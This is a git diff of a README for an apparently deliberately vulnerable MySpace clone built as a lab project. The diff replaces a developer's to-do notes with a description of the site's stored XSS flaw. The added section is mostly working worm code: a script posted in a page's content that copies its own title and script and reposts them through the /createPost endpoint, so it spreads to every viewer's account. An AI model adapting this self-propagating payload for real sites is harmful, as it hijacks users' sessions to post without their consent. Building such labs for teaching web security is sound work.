@@ -1,4 +1,4 @@
-# MySpaceWorm
+# YourSpaceWorm
 Simple myspace clone vulnerable to a myspace worm
 
 ## Database:
@@ -25,8 +25,44 @@ Mongodb nosql database. Everything stored as documents (jsons)
 }
 ```
 
-## to do
+## Stored XXS
+The website posts are vulnerable to stored xxs. Users can put js code into both the title and content of the posts which allows them to customize their profile. 
 
-Front end has to be handled.  Probably hella ways you can do it.  I kinda spammed this out after doing some other work and had to test just with postman.  Everthing seemed to be working right but im not 100% sure.  I dont know how much info u need for the front end but at the very least I stored the id and username into the cookie, so the id can be accessible and used to fetch data, and the username is there.  Now that I think about it, its prob better to have the name stored (instead of username) and use that for displaying the name somewhere or something.  I wasnt exactly sure what routes were gated behind the log in, and depending on how much u want the website to have, u should prob add some more routes for sending some pages or something.  It might make sense to move alot of routes to /private/whatever the route is, and everything past /private is gated by needing to be logged in.  Thats a pretty common strat but u can configure it however suits ya.  Also rn mongodb only listens on localhost, we can change that in app.js, i just didnt do that yet.  Also for whatever reason rn i have it so that signing up redirects u to login, form there ud have to put in the new login credentials, and then log in.  Ik thats a little weird but w/e .
+# Worm Code 
 
-Thank you for listening to my ted talk - farhan
+### Title
+```html
+<!-- Title -->
+<span class="worm-title">Mike Zylka is the coolest person out there. Go visit his site. </span>
+```
+### Content
+```html
+<!-- Content -->
+<script class="worm-script" async>
+(function() {
+let wormTitle = "<span class='worm-title'>" +document.getElementsByClassName('worm-title')[0].parentElement.innerText + "</span>";
+console.log(wormTitle)
+
+let wormContent = "<script class=\"worm-script\" async>" + document.getElementsByClassName('worm-script')[0].innerText + "<\/script>";
+console.log(wormContent)
+
+
+async function wormPost() {
+const result = await fetch('/createPost', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                title: wormTitle,
+                                content: wormContent
+                            })
+                        }).then((res) => res.json());
+console.log(result);
+}
+
+wormPost()
+
+})();
+</script>
+```
